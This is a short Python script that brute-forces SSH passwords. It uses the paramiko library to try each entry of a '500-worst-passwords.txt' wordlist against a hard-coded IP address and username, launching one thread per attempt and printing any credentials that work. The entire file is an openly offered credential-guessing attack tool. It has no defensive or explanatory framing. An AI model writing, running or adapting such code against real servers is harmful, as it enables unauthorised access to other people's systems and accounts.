import paramiko, itertools, string
import time
import threading
import _thread

def attempt(IP,UserName,Password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, password=Password)
    except paramiko.AuthenticationException:
        ssh.close()
        return
    else:
        print ('[!] %s:%s is CORRECT!' % (UserName, Password))
        _thread.interrupt_main()
    ssh.close()
    return

ip = '25.232.148.124'
username = 'Lisa\ Shi'
start_time = time.time()
passwordFile = open("500-worst-passwords.txt")
###permutations = itertools.product(string.ascii_lowercase, repeat=3)
permutations = [line.rstrip('\n') for line in passwordFile]
index = 0
for permutation in permutations:
    ##password = ''.join(permutation)
    password = permutation
    index += 1
    if index % 100 == 0:
        print ("on: %s" % password)
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()


print("--- %s seconds ---" % (time.time() - start_time))
print ("Unable to find correct password")